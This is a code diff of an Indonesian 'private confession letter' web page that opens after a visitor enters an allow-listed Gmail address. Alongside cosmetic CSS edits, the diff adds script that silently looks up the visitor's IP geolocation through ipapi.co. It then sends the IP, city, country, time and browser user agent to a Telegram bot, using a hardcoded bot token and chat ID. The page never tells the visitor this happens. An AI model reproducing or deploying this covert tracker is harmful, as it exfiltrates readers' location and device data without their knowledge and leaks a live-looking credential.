@@ -2,12 +2,16 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<title>Private Letter</title>
+<title>Private Confess Letter</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
 <style>
+*{box-sizing:border-box}
 body{
-  font-family: 'Poppins', sans-serif;
-  background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+  font-family:'Poppins',sans-serif;
+  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
   color:#fff;
   display:flex;
   justify-content:center;
@@ -15,72 +19,101 @@ body{
   height:100vh;
 }
 .card{
-  background:rgba(255,255,255,0.08);
+  width:340px;
   padding:30px;
-  border-radius:16px;
-  width:320px;
+  border-radius:20px;
+  background:rgba(255,255,255,0.08);
+  backdrop-filter:blur(12px);
+  box-shadow:0 20px 40px rgba(0,0,0,.3);
   text-align:center;
-  backdrop-filter: blur(10px);
 }
 input{
   width:100%;
   padding:12px;
-  border-radius:10px;
-  border:none;
   margin-top:15px;
+  border-radius:12px;
+  border:none;
+  outline:none;
 }
 button{
-  margin-top:15px;
-  padding:12px;
   width:100%;
+  padding:12px;
+  margin-top:15px;
   border:none;
-  border-radius:10px;
+  border-radius:12px;
   background:#ff6a88;
   color:#fff;
   font-weight:600;
+  cursor:pointer;
 }
 #loading{
   display:none;
-  margin-top:20px;
+  margin-top:15px;
+  font-size:14px;
+  opacity:.8;
 }
 </style>
 </head>
 <body>
 
 <div class="card">
-  <h2>Surat Pribadi</h2>
+  <h2>💌 Surat Rahasia</h2>
   <p>Masukkan Gmail terdaftar</p>
+
   <input type="email" id="email" placeholder="example@gmail.com">
   <button onclick="checkEmail()">Buka Surat</button>
-  <div id="loading">⏳ Membuka surat...</div>
+
+  <div id="loading">⏳ Memverifikasi...</div>
 </div>
 
 <script>
-const BOT_TOKEN = "8404649278:AAGXj2Dkywrbha_PYq26kx0fIAB44ZQiBRc";
-const CHAT_ID   = "8404649278";
+const BOT_TOKEN="8404649278:AAGXj2Dkywrbha_PYq26kx0fIAB44ZQiBRc";
+const CHAT_ID="8404649278";
+
+async function getInfo(){
+  const res = await fetch("https://ipapi.co/json/");
+  return await res.json();
+}
 
 async function checkEmail(){
-  const email = document.getElementById("email").value.trim();
+  const email=document.getElementById("email").value.trim();
   if(!email) return alert("Masukkan Gmail!");
 
   const res = await fetch("gmail.json");
   const data = await res.json();
 
   if(!data.allowed.includes(email)){
-    alert("Gmail tidak terdaftar!");
+    alert("❌ Gmail tidak terdaftar");
     return;
   }
 
   document.getElementById("loading").style.display="block";
 
-  const now = new Date().toLocaleString("id-ID");
+  const info=await getInfo();
+  const now=new Date().toLocaleString("id-ID");
+  const device=navigator.userAgent;
+
+  const message=
+`📩 *Surat Confess Dibuka*
+
+🕒 ${now}
+
+📍 Lokasi:
+Kota: ${info.city}
+Negara: ${info.country_name}
+
+🌐 IP: ${info.ip}
+
+📱 Device:
+${device}`;
 
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
     headers:{'Content-Type':'application/json'},
     body:JSON.stringify({
-      chat_id: CHAT_ID,
-      text:`📩 Seseorang telah membaca surat confess anda\n🕒 ${now}`
+      chat_id:CHAT_ID,
+      text:message,
+      parse_mode:"Markdown"
     })
   });
 
